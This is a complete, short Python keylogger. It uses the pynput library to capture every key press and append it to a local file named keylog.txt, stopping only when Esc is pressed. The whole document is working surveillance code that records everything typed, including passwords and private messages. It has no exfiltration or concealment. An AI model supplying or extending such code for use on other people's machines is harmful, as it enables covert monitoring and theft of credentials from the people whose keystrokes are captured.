
from pynput.keyboard import Listener, Key

# Function to write keystrokes to a file
def write_to_file(key):
    key = str(key).replace("'", "")
    
    # Check if the user pressed 'Esc' to stop
    if key == 'Key.esc':
        print("\n[INFO] 'Esc' key pressed. Stopping keylogger.")
        return False  # Stops the listener
    
    with open("keylog.txt", "a") as file:
        file.write(key + "\n")

# Start listening for keyboard input
with Listener(on_press=write_to_file) as listener:
    listener.join()  # Keeps the program running